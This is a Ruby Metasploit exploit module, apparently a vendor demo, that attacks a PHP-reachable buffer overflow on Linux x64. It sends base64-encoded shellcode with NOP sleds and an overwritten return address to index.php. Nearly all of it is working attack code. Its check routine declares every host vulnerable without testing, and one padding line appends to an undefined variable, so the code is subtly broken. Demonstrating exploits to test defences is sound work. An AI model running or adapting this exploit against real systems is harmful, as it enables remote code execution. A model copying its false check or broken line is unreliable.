##
# This module requires Metasploit
##

require 'base64'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Polyverse c-exploit example',
      'Description'    => %q|
        This is a module for exploiting a buffer overflow via PHP 
      |,
      'Author'         => 'Polyverse Corp.',
      'References'     =>
        [
          [ 'URL', 'https://polyverse.io' ],
        ],
      'Platform'       => 'linux',
      'Payload'        =>
        {
        },
      'Arch'           => [ARCH_X64],
      'Targets'        => 
        [
          [
            'Linux x64',
            {
              'Arch'   => ARCH_X64,
	      'Ret'    => 0x7fffffe904a0 #Base value when only 1 character sent to URI
            }
          ]
        ],
      'DefaultTarget'  => 0
    ))
    
    register_options(
      [
	OptString.new('NOP', [true, 'NOP Byte Code (probably should get this from ARCH)', "\x90"]),
	OptInt.new('PREPAD', [true, 'Number of NOP instructions before payload', 100]), # Should be at least 16
	OptInt.new('POSTPAD', [true, 'Number of NOP instructions after payload', 100])
      ])
  end

  # Returns that the remote host is always vulnerable
  def check
    print_status("def check...")
    return Exploit::CheckCode::Vulnerable
  end

  def exploit
    print_status("start exploit...")

    # First approximation of where we should return to
    ret = target.ret					# Base address of "ret" when passed a single character
    ret += 7 + 17 + 8					# Location immediately after "owned" return address
    ret += datastore['PREPAD'] / 2			# Move halfway into the pre-NOP-sled we're about to build

    # Build the payload that delivers the goods
    p = "a" * 17					# "Owned" return address is at 18..25 in the message
    p += Rex::Arch.pack_addr(target.arch, ret)		# The contents will be backpatched later
    p += datastore['NOP'] * datastore['PREPAD']		# Build a NOP sled before our shellcode
    p += payload.encoded				# Sandwich the shellcode here
    p += datastore['NOP'] * datastore['POSTPAD']	# Build a NOP sled after the shellcode (n/a right now)
    if (p.length % 3) == 0 then b += 'b' end		# Guarantee a trailing "=" after base64 encoding

    # Proceed as if this is the final payload
    print_status("p: #{p} (Length: #{p.length})")
    p64 = Base64.strict_encode64(p)			# Encode payload in base64
    print_status("p64: #{p64} (Length: #{p64.length})")

    # Deal with the side-effect of the payload size
    ret -= p64.length / 16 * 16				# Location moves based on payload size which we now know
    p[17..24] = Rex::Arch.pack_addr(target.arch, ret)	# We should be very close to the middle of the NOP sled again

    # Finalize the payload (should be the same size)
    print_status("p: #{p} (Length: #{p.length})")
    p64 = Base64.strict_encode64(p)			# Re-encode payload in base64
    print_status("p64: #{p64} (Length: #{p64.length})")

#   res = send_request_raw({'uri'=>'/index.php?q=x'})

    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path,"index.php"),
      'method'    => 'POST',
      'vars_post' => {
      'q' => p64
      }
    })

    print_status("#{res}")
    print_status("done exploit....")
  end
end
